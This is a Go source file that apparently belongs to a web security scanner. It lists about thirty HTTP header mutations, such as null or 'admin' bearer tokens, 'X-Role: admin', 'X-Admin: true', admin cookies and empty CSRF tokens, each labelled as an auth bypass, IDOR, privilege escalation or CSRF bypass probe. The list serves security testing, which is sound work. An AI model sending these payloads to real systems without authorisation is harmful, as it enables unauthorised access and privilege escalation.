package headers

import "github.com/cc1a2b/jshunter/engine"

func GetAuthMutations() []engine.Mutation {
	return []engine.Mutation{
		{Header: "Authorization", Value: "Bearer null", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "Authorization", Value: "Bearer undefined", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "Authorization", Value: "Basic Og==", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "Authorization", Value: "Bearer admin", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "Authorization", Value: "Bearer test", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "Authorization", Value: "Bearer 000000", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "Authorization", Value: "", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-Authorization", Value: "Bearer admin", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-API-Key", Value: "admin", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-API-Key", Value: "test", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-API-Key", Value: "000000", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-Auth-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-Auth-Token", Value: "000000", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-Auth-Token", Value: "null", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-User-Id", Value: "1", Category: "Auth", Impact: "IDOR"},
		{Header: "X-User-Id", Value: "admin", Category: "Auth", Impact: "IDOR"},
		{Header: "X-User", Value: "admin", Category: "Auth", Impact: "Auth Confusion"},
		{Header: "X-Username", Value: "admin", Category: "Auth", Impact: "Auth Confusion"},
		{Header: "X-Role", Value: "admin", Category: "Auth", Impact: "Privilege Escalation"},
		{Header: "X-Role", Value: "administrator", Category: "Auth", Impact: "Privilege Escalation"},
		{Header: "X-Admin", Value: "true", Category: "Auth", Impact: "Privilege Escalation"},
		{Header: "X-Admin", Value: "1", Category: "Auth", Impact: "Privilege Escalation"},
		{Header: "X-Privilege", Value: "admin", Category: "Auth", Impact: "Privilege Escalation"},
		{Header: "Cookie", Value: "admin=true", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "Cookie", Value: "role=admin", Category: "Auth", Impact: "Privilege Escalation"},
		{Header: "Cookie", Value: "isAdmin=1", Category: "Auth", Impact: "Privilege Escalation"},
		{Header: "X-Access-Token", Value: "admin", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-Session-Token", Value: "000000", Category: "Auth", Impact: "Auth Bypass"},
		{Header: "X-CSRF-Token", Value: "", Category: "Auth", Impact: "CSRF Bypass"},
		{Header: "X-XSRF-Token", Value: "", Category: "Auth", Impact: "CSRF Bypass"},
	}
}
